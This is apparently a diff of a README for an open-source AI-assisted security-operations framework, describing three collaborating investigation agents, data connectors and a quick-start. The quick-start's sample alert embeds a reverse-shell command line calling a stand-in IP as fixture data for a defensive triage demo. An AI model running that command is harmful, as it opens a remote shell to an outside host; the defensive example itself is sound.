@@ -1,117 +1,167 @@
-# ZainGuard AI Platform
+# ZainGuard AI
 
-An open-source Security Operations (SecOps) AI agent platform designed to automate and enhance cybersecurity tasks through intelligent automation.
+An open-source framework for AI-assisted security operations. Built for SOC teams who want to leverage AI to investigate security alerts faster — without vendor lock-in or bloated infrastructure.
 
-## 🚀 Overview
+**Simplicity is the governing principle.** The code is meant to be read and understood, not just used.
 
-ZainGuard AI Platform is a modular framework that enables security teams to deploy AI agents for various security operations tasks including threat detection, incident response, vulnerability management, and alert triage. The platform is built with extensibility in mind, allowing teams to create custom agents tailored to their specific security needs.
-
-## ✨ Key Features
-
-- **Modular Agent Architecture**: Deploy specialized AI agents for different security tasks
-- **Extensible Tool System**: Connect to SIEMs, threat intelligence feeds, ticketing systems, and more
-- **Multiple LLM Support**: Compatible with both open-source and proprietary language models
-- **RESTful API**: Easy integration with existing security tools and workflows
-- **Real-time Processing**: Handle high-volume security events and alerts
-- **Community-Driven**: Open-source with active community contributions
-
-## 🏗️ Architecture
-
-The platform consists of several key components:
-
-- **Agent Core**: Central orchestration and management system
-- **Tooling Layer**: APIs and connectors for security tools
-- **Data Layer**: Vector database and knowledge base for RAG
-- **API Gateway**: Centralized interface for all interactions
-
-## 🚀 Quick Start
-
-### Prerequisites
-
-- Python 3.9+
-- Docker (optional, for containerized deployment)
-- Access to an LLM API (OpenAI, Anthropic, or local model via Ollama)
-
-### Installation
-
-```bash
-# Clone the repository
-git clone https://github.com/ZainGuard/ZainGuard-AI.git
-cd ZainGuard-AI
-
-# Create virtual environment
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-
-# Install dependencies
-pip install -e .
-
-# Set up environment variables
-cp .env.example .env
-# Edit .env with your configuration
-```
-
-### Running Your First Agent
-
-```bash
-# Start the API server
-python -m src.api.main
-
-# In another terminal, run a sample agent
-python -m src.agents.triage_agent
-```
-
-## 📚 Documentation
-
-- [Getting Started Guide](docs/getting-started.md)
-- [Architecture Overview](docs/architecture.md)
-- [API Reference](docs/api-reference.md)
-- [Contributing Guidelines](CONTRIBUTING.md)
-
-## 🤝 Contributing
-
-We welcome contributions from the community! Please see our [Contributing Guidelines](CONTRIBUTING.md) for details on how to get started.
-
-### Development Setup
-
-1. Fork the repository
-2. Create a feature branch: `git checkout -b feature/amazing-feature`
-3. Make your changes and add tests
-4. Run the test suite: `pytest`
-5. Commit your changes: `git commit -m 'Add amazing feature'`
-6. Push to the branch: `git push origin feature/amazing-feature`
-7. Open a Pull Request
-
-## 📋 Roadmap
-
-- [ ] Core agent framework
-- [ ] SIEM integration tools
-- [ ] Threat intelligence connectors
-- [ ] Incident response automation
-- [ ] Vulnerability management agents
-- [ ] Web UI dashboard
-- [ ] Advanced analytics and reporting
-
-## 🛡️ Security
-
-Security is our top priority. Please review our [Security Policy](SECURITY.md) and report any vulnerabilities responsibly.
-
-## 📄 License
-
-This project is licensed under the Apache License 2.0 - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- The open-source security community
-- Contributors and maintainers
-- Security researchers and practitioners
-
-## 📞 Support
-
-- 📖 [Documentation](docs/)
-- 🐛 [Issue Tracker](https://github.com/ZainGuard/ZainGuard-AI/issues)
-- 💬 [Discussions](https://github.com/ZainGuard/ZainGuard-AI.git/discussions)
+> All AI-generated investigation outputs require human review before any action is taken. The framework accelerates analysis — humans make the final call.
 
 ---
 
-**Built with ❤️ for the security community**
+## How It Works
+
+Given a security alert, three agents collaborate to produce a documented investigation:
+
+```
+[Alert Event]
+      │
+      ▼
+┌─────────────┐
+│   Director  │  Triages the alert, generates 3 focused investigative questions
+└──────┬──────┘
+       │
+       ▼
+┌──────────────┐
+│ Investigator │  Answers each question by querying available data sources
+└──────┬───────┘
+       │
+       ▼
+┌──────────────┐
+│   Reviewer   │  Validates findings, finalizes the case, hands off to human
+└──────┬───────┘
+       │
+       ▼
+[Human Analyst Review]
+```
+
+The Investigator queries three data layers:
+- **Layer 1 — Security Telemetry**: Snowflake/data lake, CloudTrail, Okta, Wiz, CrowdStrike
+- **Layer 2 — Organizational Knowledge**: Glean, GitHub, Slack, Confluence, Google Drive
+- **Layer 3 — Threat Intelligence**: VirusTotal, AbuseIPDB, Shodan, MISP
+
+---
+
+## Quick Start
+
+```bash
+pip install zainguard-ai-soc
+```
+
+```python
+import os
+from zainguard_ai_soc.pipeline import investigate
+from zainguard_ai_soc.models import Alert, Severity
+from zainguard_ai_soc.connectors.virustotal import VirusTotalConnector
+
+report = investigate(
+    alert=Alert(
+        id="wiz-2024-0042",
+        title="Suspicious outbound connection from EC2 (possible reverse shell)",
+        source="wiz_runtime",
+        severity=Severity.HIGH,
+        raw={
+            "resource_id": "i-0abc1234def56789",
+            "process": {"command_line": "/bin/bash -i >& /dev/tcp/198.51.100.42/4444 0>&1"},
+            "network": {"destination_ip": "198.51.100.42", "destination_port": 4444},
+        },
+    ),
+    connectors=[
+        VirusTotalConnector(api_key=os.environ["VIRUSTOTAL_API_KEY"]),
+        # Add more: SnowflakeConnector, OktaConnector, GleanConnector...
+    ],
+)
+
+print(report.verdict)            # Verdict.MALICIOUS / .BENIGN / .INCONCLUSIVE
+print(report.executive_summary)  # 2-3 sentence summary
+print(report.recommendations)   # ["Isolate instance i-0abc1234", ...]
+```
+
+Run the included example:
+```bash
+export ANTHROPIC_API_KEY=your_key
+export VIRUSTOTAL_API_KEY=your_key
+python examples/reverse_shell_alert.py
+```
+
+---
+
+## Foundational Requirements
+
+For effective investigations, your deployment should have:
+
+| Requirement | Purpose | Minimum |
+|-------------|---------|---------|
+| Security data lake | Layer 1 telemetry queries | Snowflake, BigQuery, or Elasticsearch |
+| Schema registry | Prevents hallucinated queries | YAML file mapping tables to fields (see `schema_examples/`) |
+| Knowledge base | Layer 2 context for expected activity | Glean, GitHub, or Confluence API |
+| Threat intel source | Layer 3 IOC enrichment | VirusTotal free tier |
+| Anthropic API key | LLM for all agents | `ANTHROPIC_API_KEY` env variable |
+
+Without a schema registry, the Investigator agent may produce invalid queries against your data lake.
+
+---
+
+## Available Connectors
+
+| Connector | Layer | Status |
+|-----------|-------|--------|
+| `VirusTotalConnector` | Layer 3 — TI | Available |
+| `AbuseIPDBConnector` | Layer 3 — TI | Coming soon |
+| `ShodanConnector` | Layer 3 — TI | Coming soon |
+| `SnowflakeConnector` | Layer 1 — Telemetry | Coming soon |
+| `OktaConnector` | Layer 1 — Identity | Coming soon |
+| `CloudTrailConnector` | Layer 1 — AWS | Coming soon |
+| `WizConnector` | Layer 1 — Runtime | Coming soon |
+| `GleanConnector` | Layer 2 — Knowledge | Coming soon |
+| `GitHubConnector` | Layer 2 — Code/Changes | Coming soon |
+
+---
+
+## Project Structure
+
+```
+zainguard-ai/
+├── zainguard_ai_soc/                    # Core Python package
+│   ├── agents/
+│   │   ├── director.py           # Director Agent
+│   │   ├── investigator.py       # Investigator Agent
+│   │   └── reviewer.py           # Reviewer Agent
+│   ├── connectors/               # Data source connectors
+│   │   ├── base.py               # Connector interface
+│   │   └── virustotal.py         # VirusTotal (Layer 3)
+│   ├── schema/
+│   │   └── registry.py           # Schema registry
+│   ├── pipeline.py               # Main investigation pipeline
+│   └── models.py                 # Shared data models
+├── examples/
+│   └── reverse_shell_alert.py    # End-to-end example
+├── schema_examples/
+│   └── snowflake_security.yaml   # Example schema registry file
+├── src/                          # Legacy v1 code (preserved for reference)
+├── CLAUDE.md                     # Full project vision and architecture
+└── pyproject.toml
+```
+
+---
+
+## Contributing
+
+The most impactful contributions are **new connectors**. Each connector:
+- Implements `BaseConnector` (`zainguard_ai_soc/connectors/base.py`)
+- Has a working usage example in `examples/`
+- Includes a schema YAML if it's a data lake connector
+- Has tests that work without live credentials (mock the HTTP calls)
+
+See `CONTRIBUTING.md` for full guidelines.
+
+---
+
+## Architecture
+
+See [CLAUDE.md](CLAUDE.md) for the full framework vision, design principles, agent architecture, data layers, and foundational requirements.
+
+---
+
+## License
+
+Apache 2.0 — see [LICENSE](LICENSE).
